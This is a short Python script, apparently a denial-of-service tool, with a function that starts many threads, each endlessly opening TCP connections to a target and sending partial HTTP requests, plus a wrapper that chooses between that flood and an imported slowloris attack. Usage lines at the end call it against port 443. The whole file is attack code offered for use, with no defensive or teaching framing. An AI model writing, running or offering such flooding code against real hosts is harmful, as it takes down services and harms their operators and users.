import socket
import threading

from slowloris import slowloris_attack

def perform_ddos_attack(target_ip, target_port=80, num_threads=10):
    def attack():
        while True:
            try:
                # Create a socket object
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

                # Connect to the target
                sock.connect((target_ip, target_port))

                # Send a dummy request
                sock.sendto(b"GET / HTTP/1.1\r\n", (target_ip, target_port))

                # Close the socket
                sock.close()
            except Exception as e:
                print(f"Error during DDoS attack: {str(e)}")

    # Create and start multiple threads to simulate concurrent requests
    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=attack)
        threads.append(thread)
        thread.start()

    # Wait for all threads to finish
    for thread in threads:
        thread.join()

def ddos(host, port, ssl=False, method=None):
    if method == 1:
        slowloris_attack(host, port, 100, True, True, False, None, None, ssl, 5)
    
    if method == 2:
        perform_ddos_attack(host, port, 100)

# Usage:
ddos("", 443, True, 1)
ddos("", 443, True, 1)
